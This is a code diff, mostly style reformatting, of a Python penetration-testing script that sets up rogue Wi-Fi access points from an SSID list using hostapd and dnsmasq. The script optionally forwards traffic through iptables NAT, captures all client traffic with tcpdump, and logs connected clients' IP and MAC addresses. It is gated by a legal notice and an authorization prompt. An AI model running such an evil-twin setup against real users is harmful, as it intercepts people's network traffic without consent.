@@ -5,30 +5,36 @@ Creates fake access points from SSID list and captures data from connecting clie
 For authorized penetration testing and security research only
 """
 
-import sys
-import os
 import argparse
-import subprocess
+import os
+import shutil
 import signal
+import subprocess
+import sys
+import threading
 import time
 from datetime import datetime
 from pathlib import Path
-import threading
-import shutil
 from typing import Optional
 
-from utils import require_root, setup_logging, validate_interface, load_ssids
-
+from utils import load_ssids, require_root, setup_logging
 
 # Module-level flag for graceful shutdown (replaces sys.exit in signal handler)
 _shutdown_requested: bool = False
 
 
 class SSIDCapturer:
-    def __init__(self, interface: str, ssid_file: str, output_dir: str,
-                 channel: int = 6, encryption: Optional[str] = None,
-                 password: Optional[str] = None, internet_share: bool = False,
-                 upstream_interface: Optional[str] = None) -> None:
+    def __init__(
+        self,
+        interface: str,
+        ssid_file: str,
+        output_dir: str,
+        channel: int = 6,
+        encryption: Optional[str] = None,
+        password: Optional[str] = None,
+        internet_share: bool = False,
+        upstream_interface: Optional[str] = None,
+    ) -> None:
         self.interface: str = interface
         self.ssid_file: str = ssid_file
         self.output_dir: Path = Path(output_dir)
@@ -54,12 +60,12 @@ class SSIDCapturer:
         log_msg = f"[{timestamp}] {message}"
         self.logger.info(message)
 
-        with open(self.log_file, 'a') as f:
+        with open(self.log_file, "a") as f:
             f.write(log_msg + "\n")
 
     def check_dependencies(self) -> bool:
         """Check if required tools are installed."""
-        required: list[str] = ['hostapd', 'dnsmasq', 'tcpdump', 'iptables']
+        required: list[str] = ["hostapd", "dnsmasq", "tcpdump", "iptables"]
         missing: list[str] = []
 
         for tool in required:
@@ -109,7 +115,7 @@ ignore_broadcast_ssid=0
 """
 
         # Add encryption if specified
-        if self.encryption == 'wpa2' and self.password:
+        if self.encryption == "wpa2" and self.password:
             config += f"""
 # WPA2 Configuration
 auth_algs=1
@@ -118,7 +124,7 @@ wpa_passphrase={self.password}
 wpa_key_mgmt=WPA-PSK
 rsn_pairwise=CCMP
 """
-        elif self.encryption == 'wep' and self.password:
+        elif self.encryption == "wep" and self.password:
             config += f"""
 # WEP Configuration (legacy)
 auth_algs=3
@@ -127,7 +133,7 @@ wep_key0="{self.password}"
 """
         # Otherwise, open network (no encryption)
 
-        with open(config_file, 'w') as f:
+        with open(config_file, "w") as f:
             f.write(config)
 
         return config_file
@@ -147,7 +153,7 @@ log-dhcp
 bind-interfaces
 """
 
-        with open(config_file, 'w') as f:
+        with open(config_file, "w") as f:
             f.write(config)
 
         return config_file
@@ -158,18 +164,24 @@ bind-interfaces
 
         try:
             # Bring interface down
-            subprocess.run(['ip', 'link', 'set', self.interface, 'down'],
-                           check=True, capture_output=True)
+            subprocess.run(
+                ["ip", "link", "set", self.interface, "down"], check=True, capture_output=True
+            )
 
             # Set IP address
-            subprocess.run(['ip', 'addr', 'flush', 'dev', self.interface],
-                           check=True, capture_output=True)
-            subprocess.run(['ip', 'addr', 'add', '10.0.0.1/24', 'dev', self.interface],
-                           check=True, capture_output=True)
+            subprocess.run(
+                ["ip", "addr", "flush", "dev", self.interface], check=True, capture_output=True
+            )
+            subprocess.run(
+                ["ip", "addr", "add", "10.0.0.1/24", "dev", self.interface],
+                check=True,
+                capture_output=True,
+            )
 
             # Bring interface up
-            subprocess.run(['ip', 'link', 'set', self.interface, 'up'],
-                           check=True, capture_output=True)
+            subprocess.run(
+                ["ip", "link", "set", self.interface, "up"], check=True, capture_output=True
+            )
 
             self.log("Interface configured successfully")
             return True
@@ -187,22 +199,62 @@ bind-interfaces
 
         try:
             # Enable IP forwarding
-            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'],
-                           check=True, capture_output=True)
+            subprocess.run(
+                ["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True, capture_output=True
+            )
 
             # Setup NAT
-            subprocess.run(['iptables', '-t', 'nat', '-A', 'POSTROUTING',
-                           '-o', self.upstream_interface, '-j', 'MASQUERADE'],
-                           check=True, capture_output=True)
+            subprocess.run(
+                [
+                    "iptables",
+                    "-t",
+                    "nat",
+                    "-A",
+                    "POSTROUTING",
+                    "-o",
+                    self.upstream_interface,
+                    "-j",
+                    "MASQUERADE",
+                ],
+                check=True,
+                capture_output=True,
+            )
 
-            subprocess.run(['iptables', '-A', 'FORWARD', '-i', self.interface,
-                           '-o', self.upstream_interface, '-j', 'ACCEPT'],
-                           check=True, capture_output=True)
+            subprocess.run(
+                [
+                    "iptables",
+                    "-A",
+                    "FORWARD",
+                    "-i",
+                    self.interface,
+                    "-o",
+                    self.upstream_interface,
+                    "-j",
+                    "ACCEPT",
+                ],
+                check=True,
+                capture_output=True,
+            )
 
-            subprocess.run(['iptables', '-A', 'FORWARD', '-i', self.upstream_interface,
-                           '-o', self.interface, '-m', 'state', '--state',
-                           'RELATED,ESTABLISHED', '-j', 'ACCEPT'],
-                           check=True, capture_output=True)
+            subprocess.run(
+                [
+                    "iptables",
+                    "-A",
+                    "FORWARD",
+                    "-i",
+                    self.upstream_interface,
+                    "-o",
+                    self.interface,
+                    "-m",
+                    "state",
+                    "--state",
+                    "RELATED,ESTABLISHED",
+                    "-j",
+                    "ACCEPT",
+                ],
+                check=True,
+                capture_output=True,
+            )
 
             self.log("Internet sharing enabled")
             return True
@@ -217,29 +269,67 @@ bind-interfaces
             return
 
         try:
-            subprocess.run(['iptables', '-t', 'nat', '-D', 'POSTROUTING',
-                           '-o', self.upstream_interface, '-j', 'MASQUERADE'],
-                           capture_output=True)
-            subprocess.run(['iptables', '-D', 'FORWARD', '-i', self.interface,
-                           '-o', self.upstream_interface, '-j', 'ACCEPT'],
-                           capture_output=True)
-            subprocess.run(['iptables', '-D', 'FORWARD', '-i', self.upstream_interface,
-                           '-o', self.interface, '-m', 'state', '--state',
-                           'RELATED,ESTABLISHED', '-j', 'ACCEPT'],
-                           capture_output=True)
+            subprocess.run(
+                [
+                    "iptables",
+                    "-t",
+                    "nat",
+                    "-D",
+                    "POSTROUTING",
+                    "-o",
+                    self.upstream_interface,
+                    "-j",
+                    "MASQUERADE",
+                ],
+                capture_output=True,
+            )
+            subprocess.run(
+                [
+                    "iptables",
+                    "-D",
+                    "FORWARD",
+                    "-i",
+                    self.interface,
+                    "-o",
+                    self.upstream_interface,
+                    "-j",
+                    "ACCEPT",
+                ],
+                capture_output=True,
+            )
+            subprocess.run(
+                [
+                    "iptables",
+                    "-D",
+                    "FORWARD",
+                    "-i",
+                    self.upstream_interface,
+                    "-o",
+                    self.interface,
+                    "-m",
+                    "state",
+                    "--state",
+                    "RELATED,ESTABLISHED",
+                    "-j",
+                    "ACCEPT",
+                ],
+                capture_output=True,
+            )
         except (subprocess.CalledProcessError, FileNotFoundError, OSError):
             pass
 
     def start_packet_capture(self, ssid: str) -> bool:
         """Start tcpdump to capture traffic."""
-        pcap_file: Path = self.output_dir / f"capture_{ssid.replace(' ', '_')}_{int(time.time())}.pcap"
+        pcap_file: Path = (
+            self.output_dir / f"capture_{ssid.replace(' ', '_')}_{int(time.time())}.pcap"
+        )
 
-        cmd: list[str] = ['tcpdump', '-i', self.interface, '-w', str(pcap_file), '-U']
+        cmd: list[str] = ["tcpdump", "-i", self.interface, "-w", str(pcap_file), "-U"]
 
         try:
-            self.capture_process = subprocess.Popen(cmd,
-                                                     stdout=subprocess.PIPE,
-                                                     stderr=subprocess.PIPE)
+            self.capture_process = subprocess.Popen(
+                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE
+            )
             self.log(f"Packet capture started: {pcap_file}")
             return True
         except Exception as e:
@@ -262,22 +352,23 @@ bind-interfaces
         while not _shutdown_requested:
             try:
                 # Get ARP table
-                result = subprocess.run(['ip', 'neigh', 'show', 'dev', self.interface],
-                                        capture_output=True, text=True)
+                result = subprocess.run(
+                    ["ip", "neigh", "show", "dev", self.interface], capture_output=True, text=True
+                )
 
                 if result.stdout:
-                    lines = result.stdout.strip().split('\n')
+                    lines = result.stdout.strip().split("\n")
                     active_clients: list[str] = []
 
                     for line in lines:
                         parts = line.split()
                         if len(parts) >= 5:
                             ip: str = parts[0]
-                            mac: str = parts[4] if parts[3] == 'lladdr' else 'unknown'
+                            mac: str = parts[4] if parts[3] == "lladdr" else "unknown"
                             active_clients.append(f"{ip} - {mac}")
 
                     if active_clients:
-                        with open(self.clients_file, 'a') as f:
+                        with open(self.clients_file, "a") as f:
                             timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                             f.write(f"\n[{timestamp}] SSID: {self.current_ssid}\n")
                             for client in active_clients:
@@ -310,11 +401,11 @@ bind-interfaces
 
         # Start hostapd
         self.log("Starting hostapd...")
-        hostapd_cmd: list[str] = ['hostapd', str(hostapd_conf)]
+        hostapd_cmd: list[str] = ["hostapd", str(hostapd_conf)]
         try:
-            hostapd_proc = subprocess.Popen(hostapd_cmd,
-                                            stdout=subprocess.PIPE,
-                                            stderr=subprocess.STDOUT)
+            hostapd_proc = subprocess.Popen(
+                hostapd_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT
+            )
             self.processes.append(hostapd_proc)
             time.sleep(2)  # Let hostapd start
 
@@ -328,11 +419,11 @@ bind-interfaces
 
         # Start dnsmasq
         self.log("Starting DHCP server...")
-        dnsmasq_cmd: list[str] = ['dnsmasq', '-C', str(dnsmasq_conf), '-d']
+        dnsmasq_cmd: list[str] = ["dnsmasq", "-C", str(dnsmasq_conf), "-d"]
         try:
-            dnsmasq_proc = subprocess.Popen(dnsmasq_cmd,
-                                            stdout=subprocess.PIPE,
-                                            stderr=subprocess.STDOUT)
+            dnsmasq_proc = subprocess.Popen(
+                dnsmasq_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT
+            )
             self.processes.append(dnsmasq_proc)
             time.sleep(1)
 
@@ -347,7 +438,7 @@ bind-interfaces
         monitor_thread = threading.Thread(target=self.monitor_clients, daemon=True)
         monitor_thread.start()
 
-        self.log(f"Access point active - waiting for connections...")
+        self.log("Access point active - waiting for connections...")
         self.log(f"Channel: {self.channel}")
         self.log(f"Encryption: {self.encryption if self.encryption else 'Open (None)'}")
         self.log(f"Internet sharing: {'Enabled' if self.internet_share else 'Disabled'}")
@@ -375,8 +466,8 @@ bind-interfaces
         self.cleanup_internet_sharing()
 
         # Kill any remaining hostapd/dnsmasq
-        subprocess.run(['killall', 'hostapd'], capture_output=True)
-        subprocess.run(['killall', 'dnsmasq'], capture_output=True)
+        subprocess.run(["killall", "hostapd"], capture_output=True)
+        subprocess.run(["killall", "dnsmasq"], capture_output=True)
 
         self.log("Cleanup complete")
 
@@ -455,31 +546,41 @@ IMPORTANT LEGAL NOTICE:
   - Similar laws in other jurisdictions
 
   Always obtain proper authorization before use.
-        """
+        """,
     )
 
-    parser.add_argument('-i', '--interface', required=True,
-                        help='Wireless interface to use (will be configured)')
-    parser.add_argument('-f', '--file', required=True,
-                        help='Text file containing SSIDs')
-    parser.add_argument('-s', '--ssid',
-                        help='Specific SSID to use (if not rotating)')
-    parser.add_argument('-r', '--rotate', action='store_true',
-                        help='Rotate through all SSIDs in file')
-    parser.add_argument('-d', '--duration', type=int, default=300,
-                        help='Duration in seconds (per SSID if rotating, default: 300)')
-    parser.add_argument('-o', '--output', default='./captures',
-                        help='Output directory for captures (default: ./captures)')
-    parser.add_argument('-ch', '--channel', type=int, default=6,
-                        help='WiFi channel (default: 6)')
-    parser.add_argument('-e', '--encryption', choices=['wpa2', 'wep'],
-                        help='Encryption type (default: open/none)')
-    parser.add_argument('-p', '--password',
-                        help='Password for encrypted network')
-    parser.add_argument('--internet', action='store_true',
-                        help='Share internet connection (requires -u)')
-    parser.add_argument('-u', '--upstream',
-                        help='Upstream interface for internet sharing (e.g., eth0)')
+    parser.add_argument(
+        "-i", "--interface", required=True, help="Wireless interface to use (will be configured)"
+    )
+    parser.add_argument("-f", "--file", required=True, help="Text file containing SSIDs")
+    parser.add_argument("-s", "--ssid", help="Specific SSID to use (if not rotating)")
+    parser.add_argument(
+        "-r", "--rotate", action="store_true", help="Rotate through all SSIDs in file"
+    )
+    parser.add_argument(
+        "-d",
+        "--duration",
+        type=int,
+        default=300,
+        help="Duration in seconds (per SSID if rotating, default: 300)",
+    )
+    parser.add_argument(
+        "-o",
+        "--output",
+        default="./captures",
+        help="Output directory for captures (default: ./captures)",
+    )
+    parser.add_argument("-ch", "--channel", type=int, default=6, help="WiFi channel (default: 6)")
+    parser.add_argument(
+        "-e", "--encryption", choices=["wpa2", "wep"], help="Encryption type (default: open/none)"
+    )
+    parser.add_argument("-p", "--password", help="Password for encrypted network")
+    parser.add_argument(
+        "--internet", action="store_true", help="Share internet connection (requires -u)"
+    )
+    parser.add_argument(
+        "-u", "--upstream", help="Upstream interface for internet sharing (e.g., eth0)"
+    )
 
     args = parser.parse_args()
 
@@ -513,7 +614,7 @@ IMPORTANT LEGAL NOTICE:
         encryption=args.encryption,
         password=args.password,
         internet_share=args.internet,
-        upstream_interface=args.upstream
+        upstream_interface=args.upstream,
     )
 
     # Check dependencies
@@ -532,7 +633,7 @@ IMPORTANT LEGAL NOTICE:
     print("=" * 70)
     response = input("\nDo you have authorization to proceed? (yes/no): ")
 
-    if response.lower() != 'yes':
+    if response.lower() != "yes":
         logger.info("Authorization not confirmed. Exiting.")
         sys.exit(0)
 
@@ -548,7 +649,7 @@ IMPORTANT LEGAL NOTICE:
 
     finally:
         capturer.cleanup()
-        print(f"\n[+] Capture complete. Check output directory:")
+        print("\n[+] Capture complete. Check output directory:")
         print(f"    {os.path.abspath(args.output)}")
 
 
